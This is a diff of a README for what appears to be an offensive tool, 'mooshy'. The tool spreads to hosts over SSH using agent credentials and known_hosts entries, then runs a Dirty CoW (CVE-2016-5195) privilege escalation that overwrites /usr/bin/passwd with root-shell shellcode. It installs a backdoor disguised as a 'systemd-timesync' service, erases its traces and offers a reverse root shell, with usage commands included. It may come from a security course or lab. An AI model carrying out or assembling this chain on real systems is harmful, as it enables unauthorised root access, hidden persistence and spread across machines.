@@ -14,9 +14,9 @@
     make
 ```
 
-### To regenerate shellcode:
+## Generation of the report:
 ```sh
-    make -B cow
+    make report
 ```
 
 ## Usage:
@@ -49,14 +49,29 @@
 The tool operates in 2 modes - infection and execution.
 
 ## Infection mode
-- Connects to the victim machine(s):
-    - Connect using SSH to the `addr` specified and/or all hosts in `known_hosts` file, using either a running SSH agent(with `SSH_AUTH_SOCK` set in environment) or using password-less key, which has access to the machine(s).
-    - TODO: Buffer overflow of a HHTPD server and open reverse shell
-- 
-- Downloads and exectues the `moosh` binary to the victim machine, which performs a privilege escalation attack using a [Linux kernel vulnerability(CVE-2016-5195)](https://nvd.nist.gov/vuln/detail/CVE-2016-5195) (PoC uses vanilla Ubuntu 16.04 LTS VM) to overwrite SUID binary(`mooshy` uses `/usr/bin/passwd`) by shellcode, which sets `/proc/sys/vm/dirty_writeback_centisecs` to `0` to prevent kernel panic due to invalid state, which would otheriwse occur shortly after the execution of exploit and `exec`s `/bin/bash` with `root` privileges(it's a SUID binary owned by `root`).
-- TODO: Using the "suid root shell" installs the backdoor on the system, downloads and prepends a command to start the backdoor in the `ExecStart` line.
-- Restores the contents of the original binary in it's location.
-in "execute" mode:
+```sh
+   ./bin/mooshy -ssh -useSSHAgent -sshUser averagejoe -addr 192.168.56.102 # Specific SSH host
+   ./bin/mooshy -ssh -useSSHAgent -useSSHKnown -sshKnown known_hosts -sshUser averagejoe # SSH known_hosts
+```
+- Connects to the victim machine(s) using either of:
+    - SSH:
+        - Connects to the `addr` specified and/or all hosts in `known_hosts` file, using either a running SSH agent(with `SSH_AUTH_SOCK` set in environment) or using a password-less private key, which provides access to the machine(s).
+        - Copies the `moosh` binary to each victim using SFTP.
+    - Buffer overflow of a HHTPD server:
+        - Connects to the `addr`.
+        - Opens reverse shell on the victim machine.
+        - Downloads `moosh` binary from somewhere??
+        - TODO.
+- Executes the `moosh` binary on the victim machine, which:
+    - Exploits [Linux kernel vulnerability(CVE-2016-5195)](https://nvd.nist.gov/vuln/detail/CVE-2016-5195) (PoC uses vanilla Ubuntu 16.04 LTS VM) to overwrite a SUID binary(defaults `/usr/bin/passwd`) by shellcode, which sets `/proc/sys/vm/dirty_writeback_centisecs` to `0` and `exec`s `/bin/bash` with `root` privileges(it's a SUID binary owned by `root`). Note, that setting `/proc/sys/vm/dirty_writeback_centisecs` to `0` is required to prevent kernel panic, which would otherwise occur shortly after the execution of exploit due to an invalid state reached, which is triggered by the exploit.
+    - Using the "suid root shell" installs the backdoor on the system
+    - Creates,enables and starts a `systemd-timesync` systemd service, which launches the backdoor service.
+    - Restores the contents of the original binary in it's location and removes all temporary files.
+
+## Execution mode
+```sh
+   ./bin/mooshy -addr 192.168.56.102:22 # The port should be any open port
+```
 - Connects to the infected victim and returns a reverse `root` shell.
 
 # Dirty CoW exploit
@@ -66,5 +81,4 @@ in "execute" mode:
 >
 >  An unprivileged local user could use this flaw to gain
 >  write access to otherwise read only memory mappings and thus increase
->  their privileges on the system.
-[Source](https://bugzilla.redhat.com/show_bug.cgi?id=1384344#)
+>  their privileges on the system. ([Source](https://bugzilla.redhat.com/show_bug.cgi?id=1384344#))
